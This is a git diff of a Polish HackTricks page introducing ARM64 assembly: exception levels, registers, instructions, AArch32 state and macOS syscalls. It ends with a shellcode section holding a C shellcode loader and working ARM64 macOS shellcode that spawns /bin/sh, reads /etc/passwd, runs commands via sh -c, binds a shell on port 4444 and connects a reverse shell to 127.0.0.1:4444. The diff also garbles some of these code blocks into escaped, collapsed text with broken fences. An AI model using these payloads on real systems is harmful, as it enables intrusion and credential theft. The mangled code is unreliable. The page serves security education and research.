@@ -1,4 +1,4 @@
-# Wprowadzenie do ARM64v8
+# Introduction to ARM64v8
 
 <details>
 
@@ -19,15 +19,22 @@ Inne sposoby wsparcia HackTricks:
 W architekturze ARMv8 poziomy wykonania, znane jako Poziomy Wyjątków (EL), definiują poziom uprzywilejowania i możliwości środowiska wykonawczego. Istnieją cztery poziomy wyjątków, od EL0 do EL3, z których każdy pełni inną funkcję:
 
 1. **EL0 - Tryb Użytkownika**:
+
 * Jest to najmniej uprzywilejowany poziom i służy do wykonywania zwykłego kodu aplikacji.
 * Aplikacje działające na poziomie EL0 są izolowane od siebie nawzajem i od oprogramowania systemowego, zwiększając bezpieczeństwo i stabilność.
+
 2. **EL1 - Tryb Jądra Systemu Operacyjnego**:
+
 * Większość jąder systemów operacyjnych działa na tym poziomie.
 * EL1 ma większe uprawnienia niż EL0 i może uzyskać dostęp do zasobów systemowych, ale z pewnymi ograniczeniami, aby zapewnić integralność systemu.
+
 3. **EL2 - Tryb Hypervisora**:
+
 * Ten poziom jest używany do wirtualizacji. Hypernadzorca działający na poziomie EL2 może zarządzać wieloma systemami operacyjnymi (każdy w swoim EL1) działającymi na tym samym sprzęcie fizycznym.
 * EL2 zapewnia funkcje izolacji i kontroli środowisk zewirtualizowanych.
+
 4. **EL3 - Tryb Monitora Bezpieczeństwa**:
+
 * Jest to najbardziej uprzywilejowany poziom i często jest używany do bezpiecznego uruchamiania i zaufanych środowisk wykonawczych.
 * EL3 może zarządzać i kontrolować dostępy między stanami bezpiecznymi i niebezpiecznymi (takimi jak bezpieczne uruchamianie, zaufany system operacyjny, itp.).
 
@@ -38,20 +45,30 @@ Wykorzystanie tych poziomów pozwala na strukturalne i bezpieczne zarządzanie r
 ARM64 ma **31 rejestrów ogólnego przeznaczenia**, oznaczonych jako `x0` do `x30`. Każdy może przechowywać wartość **64-bitową** (8 bajtów). Dla operacji wymagających tylko wartości 32-bitowych, te same rejestry można uzyskać w trybie 32-bitowym, używając nazw w0 do w30.
 
 1. **`x0`** do **`x7`** - Zazwyczaj są używane jako rejestry tymczasowe i do przekazywania parametrów do podprogramów.
+
 * **`x0`** przenosi również dane zwracane przez funkcję.
+
 2. **`x8`** - W jądrze Linuxa, `x8` jest używany jako numer wywołania systemowego dla instrukcji `svc`. **W macOS używany jest x16!**
 3. **`x9`** do **`x15`** - Więcej rejestrów tymczasowych, często używanych do zmiennych lokalnych.
 4. **`x16`** i **`x17`** - **Rejestry Wywołań Wewnątrzproceduralnych**. Rejestry tymczasowe dla wartości natychmiastowych. Są one również używane do pośrednich wywołań funkcji i osłon PLT (Procedure Linkage Table).
+
 * **`x16`** jest używany jako **numer wywołania systemowego** dla instrukcji **`svc`** w **macOS**.
+
 5. **`x18`** - **Rejestr platformy**. Może być używany jako rejestr ogólnego przeznaczenia, ale na niektórych platformach jest on zarezerwowany dla zastosowań specyficznych dla platformy: wskaźnik do bieżącego bloku środowiska wątków w systemie Windows lub wskaźnik do bieżącej **struktury zadania wykonywanego w jądrze Linux**.
 6. **`x19`** do **`x28`** - Są to rejestry zachowywane przez wywołanego. Funkcja musi zachować wartości tych rejestrów dla swojego wywołującego, dlatego są one przechowywane na stosie i odzyskiwane przed powrotem do wywołującego.
 7. **`x29`** - **Wskaźnik ramki** do śledzenia ramki stosu. Gdy tworzona jest nowa ramka stosu, ponieważ wywoływana jest funkcja, rejestr **`x29`** jest **przechowywany na stosie** a nowy adres ramki (**adres `sp`**) jest **przechowywany w tym rejestrze**.
+
 * Ten rejestr może również być używany jako **rejestr ogólnego przeznaczenia**, chociaż zazwyczaj jest używany jako odniesienie do **zmiennych lokalnych**.
+
 8. **`x30`** lub **`lr`** - **Rejestr łącza**. Przechowuje **adres powrotu** po wykonaniu instrukcji `BL` (Branch with Link) lub `BLR` (Branch with Link to Register), przechowując wartość **`pc`** w tym rejestrze.
+
 * Może być również używany jak każdy inny rejestr.
 * Jeśli bieżąca funkcja ma wywołać nową funkcję i tym samym nadpisać `lr`, zostanie ona przechowana na stosie na początku, jest to epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Przechowaj `fp` i `lr`, wygeneruj miejsce i uzyskaj nowy `fp`) i odzyskana na końcu, jest to prolog (`ldp x29, x30, [sp], #48; ret` -> Odzyskaj `fp` i `lr` i zwróć).
+
 9. **`sp`** - **Wskaźnik stosu**, używany do śledzenia góry stosu.
+
 * wartość **`sp`** powinna zawsze być zachowana co najmniej z **wyrównaniem na kwadro-słowo**, w przeciwnym razie może wystąpić wyjątek wyrównania.
+
 10. **`pc`** - **Licznik programu**, który wskazuje na następną instrukcję. Ten rejestr może być aktualizowany tylko poprzez generowanie wyjątków, zwracanie wyjątków i skoki. Jedynymi zwykłymi instrukcjami, które mogą odczytać ten rejestr, są instrukcje skoku z linkiem (BL, BLR) do przechowywania adresu **`pc`** w rejestrze **`lr`** (Rejestr łącza).
 11. **`xzr`** - **Rejestr zerowy**. Nazywany również **`wzr`** w swojej formie rejestru 32-bitowego. Może być używany do łatwego uzyskania wartości zerowej (częsta operacja) lub do wykonywania porównań za pomocą **`subs`** jak **`subs XZR, Xn, #10`** przechowując wynikowe dane nigdzie (w **`xzr`**).
 
@@ -60,6 +77,7 @@ Rejestry **`Wn`** to wersja **32-bitowa** rejestru **`Xn`**.
 ### Rejestry SIMD i Zmiennoprzecinkowe
 
 Ponadto istnieje kolejnych **32 rejestry o długości 128 bitów**, które można używać w zoptymalizowanych operacjach jednoczesnego przetwarzania wielu danych (SIMD) i do wykonywania obliczeń zmiennoprzecinkowych. Są one nazywane rejestrami Vn, chociaż mogą również działać w trybie **64**-bitowym, **32**-bitowym, **16**-bitowym i **8**-bitowym, a wtedy są nazywane **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.
+
 ### Rejestry systemowe
 
 **Istnieje setki rejestrów systemowych**, zwanych również rejestrami specjalnego przeznaczenia (SPR), które są używane do **monitorowania** i **kontrolowania** zachowania **procesorów**.\
@@ -120,7 +138,7 @@ Instrukcje ARM64 mają ogólnie **format `opcode dst, src1, src2`**, gdzie **`op
 * Przykład: `ldr x0, [x1]` — To ładuje wartość z lokalizacji pamięci wskazywanej przez `x1` do `x0`.
 * **Tryb z przesunięciem**: Wskazuje przesunięcie wpływające na wskaźnik oryginału, na przykład:
 * `ldr x2, [x1, #8]`, to załaduje do x2 wartość z x1 + 8
-* &#x20;`ldr x2, [x0, x1, lsl #2]`, to załaduje do x2 obiekt z tablicy x0, z pozycji x1 (indeks) \* 4
+* `ldr x2, [x0, x1, lsl #2]`, to załaduje do x2 obiekt z tablicy x0, z pozycji x1 (indeks) \* 4
 * **Tryb z wstępnym indeksowaniem**: To zastosuje obliczenia do oryginału, uzyska wynik i przechowa nowy oryginał w oryginale.
 * `ldr x2, [x1, #8]!`, to załaduje `x1 + 8` do `x2` i przechowa w x1 wynik `x1 + 8`
 * `str lr, [sp, #-4]!`, Przechowuje rejestr łącza w sp i aktualizuje rejestr sp
@@ -136,11 +154,11 @@ Instrukcje ARM64 mają ogólnie **format `opcode dst, src1, src2`**, gdzie **`op
 * Przykład: `stp x0, x1, [sp]` — To zapisuje `x0` i `x1` do lokalizacji pamięci w `sp` i `sp + 8`, odpowiednio.
 * `stp x0, x1, [sp, #16]!` — To zapisuje `x0` i `x1` do lokalizacji pamięci w `sp+16` i `sp + 24`, odpowiednio, i aktualizuje `sp` na `sp+16`.
 * **`add`**: **Dodaj** wartości dwóch rejestrów i przechowaj wynik w rejestrze.
-* Składnia: add(s) Xn1, Xn2, Xn3 | #imm, \[przesunięcie #N | RRX\]
+* Składnia: add(s) Xn1, Xn2, Xn3 | #imm, \[przesunięcie #N | RRX]
 * Xn1 -> Cel
 * Xn2 -> Operand 1
 * Xn3 | #imm -> Operand 2 (rejestr lub natychmiastowy)
-* \[przesunięcie #N | RRX\] -> Wykonaj przesunięcie lub wywołaj RRX
+* \[przesunięcie #N | RRX] -> Wykonaj przesunięcie lub wywołaj RRX
 * Przykład: `add x0, x1, x2` — Dodaje wartości w `x1` i `x2` i przechowuje wynik w `x0`.
 * `add x5, x5, #1, lsl #12` — To równa się 4096 (1 przesunięte 12 razy) -> 1 0000 0000 0000 0000
 * **`adds`** To wykonuje `add` i aktualizuje flagi
@@ -188,12 +206,12 @@ Instrukcje ARM64 mają ogólnie **format `opcode dst, src1, src2`**, gdzie **`op
 * Przykład: `tst X1, #7` Sprawdź, czy którykolwiek z ostatnich 3 bitów X1 to 1
 * **`teq`**: Operacja XOR, odrzucająca wynik
 * **`b`**: Bezwarunkowy skok
-* Przykład: `b myFunction`&#x20;
+* Przykład: `b myFunction`
 * Należy zauważyć, że nie wypełni to rejestru łącza adresem powrotu (nieodpowiednie dla wywołań podprogramów, które muszą wrócić)
 * **`bl`**: **Skok** z linkiem, używany do **wywołania** podprogramu. Przechowuje **adres powrotu w `x30`**.
 * Przykład: `bl myFunction` — To wywołuje funkcję `myFunction` i przechowuje adres powrotu w `x30`.
 * Należy zauważyć, że nie wypełni to rejestru łącza adresem powrotu (nieodpowiednie dla wywołań podprogramów, które muszą wrócić)
-* **`blr`**: **Skok** z linkiem do rejestru, używany do **wywołania** podprogramu, gdzie cel jest **określony** w **rejestrze**. Przechowuje adres powrotu w `x30`. (To jest&#x20;
+* **`blr`**: **Skok** z linkiem do rejestru, używany do **wywołania** podprogramu, gdzie cel jest **określony** w **rejestrze**. Przechowuje adres powrotu w `x30`. (To jest
 * Przykład: `blr x1` — To wywołuje funkcję, której adres jest zawarty w `x1` i przechowuje adres powrotu w `x30`.
 * **`ret`**: **Powrót** z **podprogramu**, zwykle używając adresu w **`x30`**.
 * Przykład: `ret` — To powraca z bieżącego podprogramu, używając adresu powrotu w `x30`.
@@ -227,7 +245,7 @@ Instrukcje ARM64 mają ogólnie **format `opcode dst, src1, src2`**, gdzie **`op
 * **`stur`**: **Zapisz wartość rejestru do lokalizacji pamięci**, używając przesunięcia od innego rejestru.
 * Przykład: `stur x0, [x1, #4]` — To zapisuje wartość z `x0` do adresu pamięci, który jest o 4 bajty większy niż adres aktualnie w `x1`.
 * **`svc`** : Wykonaj **wywołanie systemowe**. Oznacza to "Supervisor Call". Gdy procesor wykonuje tę instrukcję, **przechodzi z trybu użytkownika do trybu jądra** i skacze do określonego miejsca w pamięci, gdzie znajduje się kod obsługi **wywołania systemowego jądra**.
-*   Przykład:
+* Przykład:
 
 ```armasm
 mov x8, 93  ; Załaduj numer wywołania systemowego dla wyjścia (93) do rejestru x8.
@@ -271,6 +289,7 @@ Należy zauważyć, że przejście z 64-bitowego do 32-bitowego zachodzi przy ni
 Jest to ustawiane podczas **instrukcji skoku interworking**, ale można to również ustawić bezpośrednio za pomocą innych instrukcji, gdy PC jest ustawiony jako rejestr docelowy. Przykład:
 
 Kolejny przykład:
+
 ```armasm
 _start:
 .code 32                ; Begin using A32
@@ -281,15 +300,16 @@ bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)
 mov r0, #0
 mov r0, #8
 ```
+
 ### Rejestry
 
 Istnieje 16 rejestrów 32-bitowych (r0-r15). Od r0 do r14 mogą być używane do dowolnych operacji, jednak niektóre z nich są zazwyczaj zarezerwowane:
 
-- `r15`: Licznik programu (zawsze). Zawiera adres następnej instrukcji. W A32 aktualny + 8, w T32 aktualny + 4.
-- `r11`: Wskaźnik ramki
-- `r12`: Rejestr wywołania wewnątrzproceduralnego
-- `r13`: Wskaźnik stosu
-- `r14`: Rejestr łącza
+* `r15`: Licznik programu (zawsze). Zawiera adres następnej instrukcji. W A32 aktualny + 8, w T32 aktualny + 4.
+* `r11`: Wskaźnik ramki
+* `r12`: Rejestr wywołania wewnątrzproceduralnego
+* `r13`: Wskaźnik stosu
+* `r14`: Rejestr łącza
 
 Ponadto rejestry są tworzone w **`rejestrach bankowych`**. Są to miejsca przechowujące wartości rejestrów, umożliwiające szybką zmianę kontekstu w obsłudze wyjątków i operacjach uprzywilejowanych, aby uniknąć konieczności ręcznego zapisywania i przywracania rejestrów za każdym razem. To jest realizowane poprzez **zapis stanu procesora z `CPSR` do `SPSR`** trybu procesora, do którego jest wykonywany wyjątek. Po powrocie z wyjątku, **`CPSR`** jest przywracany z **`SPSR`**.
 
@@ -301,14 +321,14 @@ W AArch32 CPSR działa podobnie jak **`PSTATE`** w AArch64 i jest również prze
 
 Pola są podzielone na kilka grup:
 
-- Rejestr Stanu Programu Aplikacji (APSR): Flagi arytmetyczne dostępne z EL0
-- Rejestry Stanu Wykonania: Zachowanie procesu (zarządzane przez system operacyjny).
+* Rejestr Stanu Programu Aplikacji (APSR): Flagi arytmetyczne dostępne z EL0
+* Rejestry Stanu Wykonania: Zachowanie procesu (zarządzane przez system operacyjny).
 
 #### Rejestr Stanu Programu Aplikacji (APSR)
 
-- Flagi **`N`**, **`Z`**, **`C`**, **`V`** (tak jak w AArch64)
-- Flag **`Q`**: Jest ustawiana na 1, gdy **następuje nasycenie liczb całkowitych** podczas wykonywania specjalnej instrukcji arytmetyki nasyceniowej. Po ustawieniu na **`1`**, zachowuje wartość do momentu ręcznego ustawienia na 0. Ponadto nie ma żadnej instrukcji, która sprawdza jego wartość w sposób domyślny, musi być odczytana ręcznie.
-- **`GE`** (Większe lub równe) Flagi: Są używane w operacjach SIMD (Single Instruction, Multiple Data), takich jak "dodawanie równoległe" i "odejmowanie równoległe". Te operacje pozwalają przetwarzać wiele punktów danych w pojedynczej instrukcji.
+* Flagi **`N`**, **`Z`**, **`C`**, **`V`** (tak jak w AArch64)
+* Flag **`Q`**: Jest ustawiana na 1, gdy **następuje nasycenie liczb całkowitych** podczas wykonywania specjalnej instrukcji arytmetyki nasyceniowej. Po ustawieniu na **`1`**, zachowuje wartość do momentu ręcznego ustawienia na 0. Ponadto nie ma żadnej instrukcji, która sprawdza jego wartość w sposób domyślny, musi być odczytana ręcznie.
+* **`GE`** (Większe lub równe) Flagi: Są używane w operacjach SIMD (Single Instruction, Multiple Data), takich jak "dodawanie równoległe" i "odejmowanie równoległe". Te operacje pozwalają przetwarzać wiele punktów danych w pojedynczej instrukcji.
 
 Na przykład instrukcja **`UADD8`** **dodaje cztery pary bajtów** (z dwóch operandów 32-bitowych) równolegle i przechowuje wyniki w rejestrze 32-bitowym. Następnie **ustawia flagi `GE` w `APSR`** na podstawie tych wyników. Każda flaga GE odpowiada jednemu z dodawania bajtów, wskazując, czy dodawanie dla tej pary bajtów **przekroczyło zakres**.
 
@@ -316,14 +336,14 @@ Instrukcja **`SEL`** używa tych flag GE do wykonywania działań warunkowych.
 
 #### Rejestry Stanu Wykonania
 
-- Bity **`J`** i **`T`**: **`J`** powinno być 0, a jeśli **`T`** jest 0, używany jest zestaw instrukcji A32, a jeśli jest 1, używany jest zestaw instrukcji T32.
-- Rejestr Stanu Bloku IT (`ITSTATE`): Są to bity od 10-15 i 25-26. Przechowują warunki dla instrukcji wewnątrz grupy z prefiksem **`IT`**.
-- Bit **`E`**: Wskazuje **kolejność bajtów**.
-- Bity **Trybu i Maska Wyjątku** (0-4): Określają bieżący stan wykonania. Piąty wskazuje, czy program działa jako 32-bitowy (1) czy 64-bitowy (0). Pozostałe 4 reprezentują **tryb wyjątku obecnie używany** (gdy występuje wyjątek i jest obsługiwany). Ustawiona liczba **określa bieżący priorytet** w przypadku wywołania innego wyjątku podczas obsługi tego.
+* Bity **`J`** i **`T`**: **`J`** powinno być 0, a jeśli **`T`** jest 0, używany jest zestaw instrukcji A32, a jeśli jest 1, używany jest zestaw instrukcji T32.
+* Rejestr Stanu Bloku IT (`ITSTATE`): Są to bity od 10-15 i 25-26. Przechowują warunki dla instrukcji wewnątrz grupy z prefiksem **`IT`**.
+* Bit **`E`**: Wskazuje **kolejność bajtów**.
+* Bity **Trybu i Maska Wyjątku** (0-4): Określają bieżący stan wykonania. Piąty wskazuje, czy program działa jako 32-bitowy (1) czy 64-bitowy (0). Pozostałe 4 reprezentują **tryb wyjątku obecnie używany** (gdy występuje wyjątek i jest obsługiwany). Ustawiona liczba **określa bieżący priorytet** w przypadku wywołania innego wyjątku podczas obsługi tego.
 
 <figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**: Pewne wyjątki mogą być wyłączone za pomocą bitów **`A`**, `I`, `F`. Jeśli **`A`** wynosi 1, oznacza to, że zostaną wywołane **przerwania asynchroniczne**. **`I`** konfiguruje odpowiedź na zewnętrzne **żądania przerwań sprzętowych** (IRQ), a F dotyczy **szybkich żądań przerwania** (FIR).
+* **`AIF`**: Pewne wyjątki mogą być wyłączone za pomocą bitów **`A`**, `I`, `F`. Jeśli **`A`** wynosi 1, oznacza to, że zostaną wywołane **przerwania asynchroniczne**. **`I`** konfiguruje odpowiedź na zewnętrzne **żądania przerwań sprzętowych** (IRQ), a F dotyczy **szybkich żądań przerwania** (FIR).
 
 ## macOS
 
@@ -372,6 +392,7 @@ Parametry ([więcej informacji w dokumentacji](https://developer.apple.com/docum
 * x2... -> Reszta argumentów wywołanej metody
 
 Więc jeśli ustawisz punkt przerwania przed skokiem do tej funkcji, łatwo można znaleźć, co jest wywoływane w lldb za pomocą (w tym przykładzie obiekt wywołuje obiekt z `NSConcreteTask`, który uruchomi polecenie):
+
 ```
 (lldb) po $x0
 <NSConcreteTask: 0x1052308e0>
@@ -388,9 +409,11 @@ Więc jeśli ustawisz punkt przerwania przed skokiem do tej funkcji, łatwo moż
 whoami
 )
 ```
+
 ### Kod powłoki
 
 Aby skompilować:
+
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
@@ -398,69 +421,55 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 # You could also use this
 ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
 ```
+
 Aby wyodrębnić bajty:
+
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
 for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
 echo -n '\\x'$c
 done
 ```
+
 <details>
 
 <summary>Kod C do przetestowania shellcode'u</summary>
-```c
-// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
-// gcc loader.c -o loader
-#include <stdio.h>
-#include <sys/mman.h>
-#include <string.h>
-#include <stdlib.h>
 
-int (*sc)();
+\`\`\`c // code from https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/helper/loader.c // gcc loader.c -o loader #include #include #include #include
 
-char shellcode[] = "<INSERT SHELLCODE HERE>";
+int (\*sc)();
 
-int main(int argc, char **argv) {
-printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
+char shellcode\[] = "";
 
-void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
+int main(int argc, char \*\*argv) { printf("\[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
-if (ptr == MAP_FAILED) {
-perror("mmap");
-exit(-1);
-}
-printf("[+] SUCCESS: mmap\n");
-printf("    |-> Return = %p\n", ptr);
+void \*ptr = mmap(0, 0x1000, PROT\_WRITE | PROT\_READ, MAP\_ANON | MAP\_PRIVATE | MAP\_JIT, -1, 0);
 
-void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
-printf("[+] SUCCESS: memcpy\n");
-printf("    |-> Return = %p\n", dst);
+if (ptr == MAP\_FAILED) { perror("mmap"); exit(-1); } printf("\[+] SUCCESS: mmap\n"); printf(" |-> Return = %p\n", ptr);
 
-int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
+void \*dst = memcpy(ptr, shellcode, sizeof(shellcode)); printf("\[+] SUCCESS: memcpy\n"); printf(" |-> Return = %p\n", dst);
 
-if (status == -1) {
-perror("mprotect");
-exit(-1);
-}
-printf("[+] SUCCESS: mprotect\n");
-printf("    |-> Return = %d\n", status);
+int status = mprotect(ptr, 0x1000, PROT\_EXEC | PROT\_READ);
 
-printf("[>] Trying to execute shellcode...\n");
+if (status == -1) { perror("mprotect"); exit(-1); } printf("\[+] SUCCESS: mprotect\n"); printf(" |-> Return = %d\n", status);
 
-sc = ptr;
-sc();
+printf("\[>] Trying to execute shellcode...\n");
 
-return 0;
-}
-```
+sc = ptr; sc();
+
+return 0; }
+
+````
 </details>
 
 #### Powłoka
 
 Pobrane z [**tutaj**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) i wyjaśnione.
 
-{% tabs %}
-{% tab title="z adr" %}
+<div data-gb-custom-block data-tag="tabs"></div>
+
+<div data-gb-custom-block data-tag="tab" data-title='z adr'>
+
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
@@ -474,38 +483,27 @@ mov  x16, #59     ; Move the execve syscall number (59) into x16.
 svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
 sh_path: .asciz "/bin/sh"
-```
-{% endtab %}
+````
 
-{% tab title="z użyciem stosu" %}
-```armasm
-.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
-.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
-.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
 
-_main:
-; We are going to build the string "/bin/sh" and place it on the stack.
 
-mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
-movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
-movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
-movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.
+\`\`\`armasm .section \_\_TEXT,\_\_text ; This directive tells the assembler to place the following code in the \_\_text section of the \_\_TEXT segment. .global \_main ; This makes the \_main label globally visible, so that the linker can find it as the entry point of the program. .align 2 ; This directive tells the assembler to align the start of the \_main function to the next 4-byte boundary (2^2 = 4).
 
-str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.
+\_main: ; We are going to build the string "/bin/sh" and place it on the stack.
+
+mov x1, #0x622F ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'. movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'. movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'. movk x1, #0x68, lsl #48 ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.
+
+str x1, \[sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.
 
 ; Prepare arguments for the execve syscall.
 
-mov  x1, #8       ; Set x1 to 8.
-sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
-mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
-mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
+mov x1, #8 ; Set x1 to 8. sub x0, sp, x1 ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack. mov x1, xzr ; Clear x1, because we need to pass NULL as the second argument to execve. mov x2, xzr ; Clear x2, because we need to pass NULL as the third argument to execve.
 
 ; Make the syscall.
 
-mov  x16, #59     ; Move the execve syscall number (59) into x16.
-svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+mov x16, #59 ; Move the execve syscall number (59) into x16. svc #0x1337 ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
-```
+````
 #### Odczyt za pomocą polecenia cat
 
 Celem jest wykonanie polecenia `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, dlatego drugi argument (x1) to tablica parametrów (które w pamięci oznaczają stos adresów).
@@ -533,8 +531,10 @@ svc 0                  ; Make the syscall
 cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
-```
-#### Wywołaj polecenie za pomocą sh z odgałęzienia, aby główny proces nie został zabity
+````
+
+**Wywołaj polecenie za pomocą sh z odgałęzienia, aby główny proces nie został zabity**
+
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -578,9 +578,11 @@ sh_c_option: .asciz "-c"
 .align 2
 touch_command: .asciz "touch /tmp/lalala"
 ```
-#### Powiązane powłoki
+
+**Powiązane powłoki**
 
 Powiązane powłoki z [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **porcie 4444**
+
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -662,9 +664,11 @@ mov  x2, xzr
 mov  x16, #59
 svc  #0x1337
 ```
-#### Odwrócony shell
+
+**Odwrócony shell**
 
 Z [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell do **127.0.0.1:4444**
+
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -731,16 +735,7 @@ mov  x2, xzr
 mov  x16, #59
 svc  #0x1337
 ```
-<details>
 
-<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Inne sposoby wsparcia HackTricks:
-
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF** sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
 
 </details>
